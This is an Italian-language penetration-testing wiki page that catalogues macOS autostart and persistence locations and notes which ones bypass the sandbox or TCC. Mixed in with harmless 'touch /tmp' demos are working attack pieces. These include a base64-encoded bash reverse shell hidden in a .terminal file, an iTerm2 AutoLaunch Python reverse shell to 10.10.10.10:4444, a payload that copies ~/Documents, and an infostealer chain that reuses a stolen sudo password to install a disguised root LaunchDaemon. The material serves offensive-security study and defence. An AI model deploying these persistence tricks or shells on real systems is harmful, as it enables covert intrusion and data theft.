# Avvio automatico macOS

{{#include ../banners/hacktricks-training.md}}

Questa sezione si basa fortemente sulla serie di blog [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), lo scopo è aggiungere **più posizioni di avvio automatico** (se possibile), indicare **quali tecniche funzionano ancora** al giorno d'oggi con l'ultima versione di macOS (13.4) e specificare i **permessi** necessari.

## Sandbox Bypass

> [!TIP]
> Qui puoi trovare posizioni di avvio utili per **sandbox bypass** che ti permettono di eseguire qualcosa semplicemente **scrivendolo in un file** e **aspettando** una **azione** molto **comune**, un **periodo di tempo determinato** o un'**azione che di solito puoi eseguire** dall'interno di una sandbox senza necessitare dei permessi di root.

### Launchd

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Riavvio
- Richiede root
- **`/Library/LaunchDaemons`**
- **Trigger**: Riavvio
- Richiede root
- **`/System/Library/LaunchAgents`**
- **Trigger**: Riavvio
- Richiede root
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Riavvio
- Richiede root
- **`~/Library/LaunchAgents`**
- **Trigger**: Rilogin
- **`~/Library/LaunchDemons`**
- **Trigger**: Rilogin

> [!TIP]
> Come fatto interessante, **`launchd`** ha una property list incorporata nella sezione Mach-O `__Text.__config` che contiene altri servizi ben noti che launchd deve avviare. Inoltre, questi servizi possono contenere `RequireSuccess`, `RequireRun` e `RebootOnSuccess`, il che significa che devono essere eseguiti e completati con successo.
>
> Ovviamente, non può essere modificata a causa del code signing.

#### Description & Exploitation

**`launchd`** è il **primo** **processo** eseguito dal kernel di OX S all'avvio e l'ultimo a terminare allo spegnimento. Dovrebbe avere sempre il **PID 1**. Questo processo **legge ed esegue** le configurazioni indicate nei **plists ASEP** in:

- `/Library/LaunchAgents`: Agenti per utente installati dall'amministratore
- `/Library/LaunchDaemons`: Daemon di sistema installati dall'amministratore
- `/System/Library/LaunchAgents`: Agenti per utente forniti da Apple.
- `/System/Library/LaunchDaemons`: Daemon di sistema forniti da Apple.

Quando un utente effettua il login i plists situati in `/Users/$USER/Library/LaunchAgents` e `/Users/$USER/Library/LaunchDemons` vengono avviati con i **permessi dell'utente connesso**.

La **principale differenza tra agents e daemons è che gli agents vengono caricati quando l'utente effettua il login e i daemons vengono caricati all'avvio del sistema** (poiché ci sono servizi come ssh che devono essere eseguiti prima che qualsiasi utente acceda al sistema). Inoltre gli agents possono usare una GUI mentre i daemons devono funzionare in background.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Ci sono casi in cui un **agent deve essere eseguito prima che l'utente effettui il login**, questi sono chiamati **PreLoginAgents**. Ad esempio, questo è utile per fornire tecnologie assistive al momento del login. Possono essere trovati anche in `/Library/LaunchAgents`(see [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) an example).

> [!TIP]
> I nuovi file di configurazione di Daemons o Agents saranno **caricati dopo il prossimo reboot o usando** `launchctl load <target.plist>` È **anche possibile caricare .plist files senza quell'estensione** con `launchctl -F <file>` (tuttavia quei plist files non verranno automaticamente caricati dopo il reboot).\
> È anche possibile **unload** con `launchctl unload <target.plist>` (il processo indicato verrà terminato),
>
> Per **assicurarsi** che non ci sia **nulla** (come un override) **che impedisca** a un **Agent** o **Daemon** di **eseguire**, eseguire: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Elenca tutti gli Agents e Daemons caricati dall'utente corrente:
```bash
launchctl list
```
#### Esempio di catena LaunchDaemon dannosa (riutilizzo della password)

Un recente infostealer per macOS ha riutilizzato una **password sudo acquisita** per depositare un user agent e un LaunchDaemon di root:

- Scrivere il ciclo dell'agent in `~/.agent` e renderlo eseguibile.
- Generare un plist in `/tmp/starter` che punti a quell'agent.
- Riutilizzare la password acquisita con `sudo -S` per copiarla in `/Library/LaunchDaemons/com.finder.helper.plist`, impostare `root:wheel` e caricarla con `launchctl load`.
- Avviare l'agent in modo silenzioso tramite `nohup ~/.agent >/dev/null 2>&1 &` per distaccare l'output.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Se un plist è di proprietà di un utente, anche se si trova nelle cartelle di sistema per i daemon, la **attività verrà eseguita come l'utente** e non come root. Questo può prevenire alcuni attacchi di escalation di privilegi.

#### Altre informazioni su launchd

**`launchd`** è il **primo** processo in user mode avviato dal **kernel**. L'avvio del processo deve avere **successo** e non può **terminare o andare in crash**. È persino **protetto** contro alcuni **segnali di terminazione**.

Una delle prime cose che `launchd` fa è **avviare** tutti i **daemon**, come:

- **Timer daemons** basati sul tempo per l'esecuzione:
- atd (`com.apple.atrun.plist`): Ha un `StartInterval` di 30min
- crond (`com.apple.systemstats.daily.plist`): Ha `StartCalendarInterval` per avviarsi alle 00:15
- **Network daemons** come:
- `org.cups.cups-lpd`: Ascolta su TCP (`SockType: stream`) con `SockServiceName: printer`
- SockServiceName deve essere o una porta o un servizio da `/etc/services`
- `com.apple.xscertd.plist`: Ascolta su TCP sulla porta 1640
- **Path daemons** che vengono eseguiti quando un percorso specificato cambia:
- `com.apple.postfix.master`: Controlla il percorso `/etc/postfix/aliases`
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: Indica nell'entry `MachServices` il nome `com.apple.xscertd.helper`
- **UserEventAgent:**
- Questo è diverso dal precedente. Fa sì che launchd lanci applicazioni in risposta a eventi specifici. Tuttavia, in questo caso il binario principale coinvolto non è `launchd` ma `/usr/libexec/UserEventAgent`. Carica plugin dalla cartella, limitata da SIP, /System/Library/UserEventPlugins/ dove ogni plugin indica il suo inizializzatore nella chiave `XPCEventModuleInitializer` oppure, nel caso dei plugin più vecchi, nel dizionario `CFPluginFactories` sotto la chiave `FB86416D-6164-2070-726F-70735C216EC0` del suo `Info.plist`.

### File di avvio della shell

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Ma è necessario trovare un'app con un TCC bypass che esegua una shell che carica questi file

#### Posizioni

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Attivazione**: Aprire un terminale con zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Attivazione**: Aprire un terminale con zsh
- Richiede root
- **`~/.zlogout`**
- **Attivazione**: Uscire da un terminale con zsh
- **`/etc/zlogout`**
- **Attivazione**: Uscire da un terminale con zsh
- Richiede root
- Potenzialmente altro in: **`man zsh`**
- **`~/.bashrc`**
- **Attivazione**: Aprire un terminale con bash
- `/etc/profile` (non ha funzionato)
- `~/.profile` (non ha funzionato)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Attivazione**: Si prevedeva l'innesco con xterm, ma **non è installato** e anche dopo l'installazione viene mostrato questo errore: xterm: `DISPLAY is not set`

#### Descrizione & Sfruttamento

Quando si avvia un ambiente shell come `zsh` o `bash`, **alcuni file di avvio vengono eseguiti**. macOS attualmente usa `/bin/zsh` come shell predefinita. Questa shell viene invocata automaticamente quando l'applicazione Terminal viene avviata o quando un dispositivo viene raggiunto via SSH. Mentre `bash` e `sh` sono anch'essi presenti in macOS, devono essere invocati esplicitamente per essere utilizzati.

La pagina man di zsh, che possiamo leggere con **`man zsh`**, contiene una lunga descrizione dei file di avvio.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Applicazioni riaperte

> [!CAUTION]
> La configurazione dell'exploitation indicata e il log out e il log in o anche il riavvio non hanno funzionato per me per far eseguire l'app. (L'app non veniva eseguita, forse deve essere in esecuzione quando queste azioni vengono effettuate)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: Restart — riapertura delle applicazioni

#### Descrizione & Exploitation

Tutte le applicazioni da riaprire sono contenute nel plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Quindi, per far sì che le applicazioni riaperte lancino la tua, devi solo **aggiungere la tua app alla lista**.

L'UUID può essere trovato listando quella directory o con `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Per controllare le applicazioni che verranno riaperte puoi fare:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Per **aggiungere un'applicazione a questa lista** puoi usare:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal tende ad avere i permessi FDA dell'utente che lo utilizza

#### Location

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Open Terminal

#### Descrizione e Sfruttamento

In **`~/Library/Preferences`** sono memorizzate le preferenze dell'utente per le applicazioni. Alcune di queste preferenze possono contenere una configurazione per **eseguire altre applicazioni/script**.

Per esempio, Terminal può eseguire un comando all'avvio:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Questa configurazione è riflessa nel file **`~/Library/Preferences/com.apple.Terminal.plist`** in questo modo:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Quindi, se il plist delle preferenze del terminal nel sistema potesse essere sovrascritto, la funzionalità **`open`** può essere usata per **aprire il terminal e quel comando verrà eseguito**.

Puoi aggiungerlo da cli con:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Script Terminal / Altre estensioni di file

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- Terminal tende ad avere i permessi FDA dell'utente che lo utilizza

#### Posizione

- **Ovunque**
- **Trigger**: Apri Terminal

#### Descrizione & Sfruttamento

Se crei uno script [**`.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) e lo apri, l'**app Terminal** verrà invocata automaticamente per eseguire i comandi indicati al suo interno. Se l'app Terminal ha privilegi speciali (ad esempio TCC), il tuo comando verrà eseguito con quei privilegi speciali.

Provalo con:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.

> [!CAUTION]
> Se Terminal ha **Full Disk Access** sarà in grado di completare quell'azione (nota che il comando eseguito sarà visibile in una terminal window).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Potresti ottenere qualche accesso TCC aggiuntivo

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
- Richiede root
- **Trigger**: Riavvia coreaudiod o il computer
- **`/Library/Audio/Plug-ins/Components`**
- Richiede root
- **Trigger**: Riavvia coreaudiod o il computer
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Riavvia coreaudiod o il computer
- **`/System/Library/Components`**
- Richiede root
- **Trigger**: Riavvia coreaudiod o il computer

#### Description

Secondo i writeup precedenti è possibile **compilare alcuni audio plugins** e far sì che vengano caricati.

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Potresti ottenere qualche accesso TCC aggiuntivo

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

I QuickLook plugins possono essere eseguiti quando **attivi l'anteprima di un file** (premi la barra spaziatrice con il file selezionato in Finder) e è installato un **plugin che supporta quel tipo di file**.

È possibile compilare il proprio plugin QuickLook, posizionarlo in una delle posizioni precedenti per caricarlo e poi andare su un file supportato e premere la barra spaziatrice per attivarlo.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Questo non ha funzionato per me, né con il LoginHook dell'utente né con il LogoutHook di root

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Devi poter eseguire qualcosa come `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

Sono deprecati ma possono essere usati per eseguire comandi quando un utente effettua il login.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Questa impostazione è memorizzata in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Per eliminarlo:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
La voce dell'utente root si trova in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Bypass Condizionale della Sandbox

> [!TIP]
> Qui puoi trovare posizioni di avvio utili per **sandbox bypass** che ti permettono di eseguire qualcosa semplicemente **scrivendolo in un file** e **aspettandoti condizioni non troppo comuni** come specifici **programmi installati, azioni "non comuni" dell'utente** o ambienti.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Utile per bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Tuttavia, devi poter eseguire il binario `crontab`
- Oppure essere root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Root richiesto per accesso diretto in scrittura. Non è richiesto root se puoi eseguire `crontab <file>`
- **Trigger**: Dipende dal cron job

#### Descrizione e Sfruttamento

Elenca i cron job dell'**utente corrente** con:
```bash
crontab -l
```
Puoi anche vedere tutti i cron jobs degli utenti in **`/usr/lib/cron/tabs/`** e **`/var/at/tabs/`** (richiede root).

In MacOS si possono trovare diverse cartelle che eseguono script con **una certa frequenza** in:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Qui puoi trovare i normali **cron** **jobs**, gli **at** **jobs** (poco usati) e i **periodic** **jobs** (usati principalmente per pulire i file temporanei). I **periodic** giornalieri possono essere eseguiti, per esempio, con: `periodic daily`.

Per aggiungere un **user cronjob programmaticamente** è possibile usare:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 in passato aveva permessi TCC concessi

#### Posizioni

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Attivazione**: Apri iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Attivazione**: Apri iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Attivazione**: Apri iTerm

#### Descrizione & Sfruttamento

Scripts memorizzati in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** verranno eseguiti. Ad esempio:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
o:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Lo script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** verrà eseguito anche:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Le preferenze di iTerm2 situate in **`~/Library/Preferences/com.googlecode.iterm2.plist`** possono **indicare un comando da eseguire** quando il terminale iTerm2 viene aperto.

Questa impostazione può essere configurata nelle impostazioni di iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

E il comando è riportato nelle preferenze:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Puoi impostare il comando da eseguire con:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Molto probabile che esistano **altri modi per abusare delle preferenze di iTerm2** per eseguire comandi arbitrari.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma xbar deve essere installato
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- Richiede i permessi di Accessibility

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: Una volta avviato xbar

#### Description

Se il popolare programma [**xbar**](https://github.com/matryer/xbar) è installato, è possibile scrivere uno script shell in **`~/Library/Application\ Support/xbar/plugins/`** che verrà eseguito quando xbar viene avviato:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma Hammerspoon deve essere installato
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Richiede permessi di Accessibility

#### Location

- **`~/.hammerspoon/init.lua`**
- **Trigger**: Once hammerspoon is executed

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) funge da piattaforma di automazione per **macOS**, sfruttando il **LUA scripting language** per le sue operazioni. Nota particolarmente utile: supporta l'integrazione di codice completo AppleScript e l'esecuzione di shell scripts, arricchendo notevolmente le sue capacità di scripting.

L'app cerca un singolo file, `~/.hammerspoon/init.lua`, e quando avviata lo script verrà eseguito.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma BetterTouchTool deve essere installato
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Richiede i permessi Automation-Shortcuts e Accessibility

#### Posizione

- `~/Library/Application Support/BetterTouchTool/*`

Questo tool permette di indicare applicazioni o script da eseguire quando vengono premute alcune scorciatoie. Un attacker potrebbe essere in grado di configurare la propria **scorciatoia e azione da eseguire nel database** per far eseguire codice arbitrario (una scorciatoia potrebbe essere semplicemente la pressione di un tasto).

### Alfred

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma Alfred deve essere installato
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Richiede i permessi Automation, Accessibility e anche Full-Disk access

#### Posizione

- `???`

Permette di creare workflow che possono eseguire codice quando vengono soddisfatte certe condizioni. Potenzialmente è possibile per un attacker creare un file di workflow e far sì che Alfred lo carichi (è necessario pagare la versione premium per usare i workflow).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma ssh deve essere abilitato e usato
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH in passato poteva avere accesso FDA

#### Posizione

- **`~/.ssh/rc`**
- **Attivazione**: Login via ssh
- **`/etc/ssh/sshrc`**
- Richiede root
- **Attivazione**: Login via ssh

> [!CAUTION]
> Per attivare ssh è necessario Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Descrizione & Sfruttamento

Di default, a meno che non ci sia `PermitUserRC no` in `/etc/ssh/sshd_config`, quando un utente **effettua il login via SSH** gli script **`/etc/ssh/sshrc`** e **`~/.ssh/rc`** verranno eseguiti.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma devi eseguire `osascript` con argomenti
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizioni

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Attivazione:** Login
- Payload dell'exploit memorizzato richiamando **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Attivazione:** Login
- Richiede root

#### Descrizione

Nelle Preferenze di Sistema -> Users & Groups -> **Login Items** puoi trovare **elementi da eseguire quando l'utente effettua il login**.  
È possibile elencarli, aggiungerli e rimuoverli dalla riga di comando:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Questi elementi sono memorizzati nel file **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Login items** possono **anche** essere indicati usando l'API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) che memorizzerà la configurazione in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP come Login Item

(Controlla la sezione precedente su Login Items, questa è un'estensione)

Se memorizzi un file **ZIP** come **Login Item** l'**Archive Utility** lo aprirà e se lo zip era, per esempio, memorizzato in **`~/Library`** e conteneva la cartella **`LaunchAgents/file.plist`** con un backdoor, quella cartella verrà creata (non lo è di default) e il plist verrà aggiunto così la prossima volta che l'utente effettua il login, il **backdoor indicato nel plist verrà eseguito**.

Un'altra opzione sarebbe creare i file **`.bash_profile`** e **`.zshenv`** nella HOME dell'utente così, se la cartella LaunchAgents esiste già, questa tecnica funzionerebbe comunque.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ma è necessario **eseguire** **`at`** e deve essere **abilitato**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- È necessario **eseguire** **`at`** e deve essere **abilitato**

#### **Description**

`at` tasks sono progettati per schedulare attività una tantum da eseguire in determinati orari. A differenza dei cron jobs, i task `at` vengono rimossi automaticamente dopo l'esecuzione. È importante notare che queste attività sono persistenti attraverso i reboot del sistema, rendendole potenziali problemi di sicurezza in determinate condizioni.

Per **impostazione predefinita** sono **disabilitati**, ma l'utente **root** può **abilitarli** con:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Questo creerà un file in 1 ora:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Controlla la coda dei job usando `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Sopra possiamo vedere due job schedulati. Possiamo stampare i dettagli del job usando `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Se le attività AT non sono abilitate, le attività create non verranno eseguite.

